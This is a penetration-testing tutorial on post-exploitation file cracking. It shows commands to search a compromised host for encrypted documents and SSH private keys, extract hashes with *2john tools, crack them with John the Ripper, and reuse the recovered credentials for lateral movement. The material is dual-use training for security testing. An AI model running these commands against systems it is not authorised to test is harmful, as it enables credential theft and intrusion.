
## Why Cracking Protected Files Matters

In real engagements, you won’t always get:

* `/etc/shadow`
* NTLM hashes
* Database dumps

What you *will* often get:

* Password-protected **PDFs**
* Encrypted **Office documents**
* **SSH private keys**
* ZIP / RAR / 7z archives
* Backup files

These frequently contain:

* Credentials
* VPN configs
* API keys
* Internal IPs
* Emails and contracts
* SSH access to other systems

And the big win: **file cracking is offline**, so no lockouts, no alerts.

---

## Step 1: Hunting for Encrypted Files

### Common encrypted document extensions

You’ll often see encryption on:

* Office files: `.docx`, `.xlsx`, `.pptx`
* LibreOffice: `.odt`, `.ods`, `.odp`
* PDFs: `.pdf`
* Archives: `.zip`, `.rar`, `.7z`

Example enumeration command:

```bash
for ext in .xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*; do
  echo "Searching $ext"
  find / -name "*$ext" 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done
```

This is **classic post-exploitation hygiene**.

---

## Step 2: Hunting for SSH Private Keys

SSH keys are *gold*.

They often:

* Have no file extension
* Are reused across systems
* Are weakly passphrase-protected (or not at all)

### Find SSH keys by content

```bash
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' / 2>/dev/null
```

### Check if a key is encrypted

```bash
ssh-keygen -yf id_rsa
```

* If it prints a public key → **not encrypted**
* If it asks for a passphrase → **encrypted**

---

## Step 3: Extract Hashes with *2john Tools*

John the Ripper doesn’t crack files directly.
Instead, it:

1. Extracts a **hash**
2. Cracks the hash **offline**

### Find available extractors

```bash
locate *2john*
```

Commonly used:

| File Type | Tool             |
| --------- | ---------------- |
| SSH keys  | `ssh2john.py`    |
| PDF       | `pdf2john.py`    |
| Office    | `office2john.py` |
| ZIP       | `zip2john`       |
| RAR       | `rar2john`       |
| 7z        | `7z2john.pl`     |

---

## Step 4: Cracking Encrypted SSH Keys

### Extract hash

```bash
ssh2john.py SSH.private > ssh.hash
```

### Crack with wordlist

```bash
john --wordlist=rockyou.txt ssh.hash
```

### Show result

```bash
john ssh.hash --show
```

Once cracked, you can immediately:

```bash
ssh -i SSH.private user@target
```

This is **lateral movement fuel**.

---

## Step 5: Cracking Password-Protected Office Documents

### Extract hash

```bash
office2john.py Protected.docx > protected.hash
```

### Crack

```bash
john --wordlist=rockyou.txt protected.hash
```

### View password

```bash
john protected.hash --show
```

Works for:

* `.docx`
* `.xlsx`
* `.pptx`
* Legacy Office formats

---

## Step 6: Cracking Password-Protected PDFs

### Extract hash

```bash
pdf2john.py PDF.pdf > pdf.hash
```

### Crack

```bash
john --wordlist=rockyou.txt pdf.hash
```

### Show result

```bash
john pdf.hash --show
```

PDF passwords are often:

* Short
* Reused
* Based on company names or dates

---

## Why This Works So Often

Users:

* Reuse passwords
* Protect files “just in case”
* Use weak passphrases
* Trust encryption more than password quality

Security teams:

* Rarely monitor **offline cracking**
* Focus more on network attacks
* Underestimate document leakage

---

## Real-World Attack Flow

1. Compromise user account
2. Find:

   * `Documents/`
   * `.ssh/`
   * Downloads
3. Extract hashes with `*2john`
4. Crack offline with:

   * Custom wordlists
   * Rules
   * OSINT-based guesses
5. Reuse credentials for:

   * SSH
   * VPN
   * Email
   * Cloud services

---

## Key Takeaways 

* **Encrypted ≠ secure**
* File cracking is **offline and stealthy**
* `*2john` scripts are essential
* SSH keys are high-impact targets
* Password-protected documents often leak more credentials

---

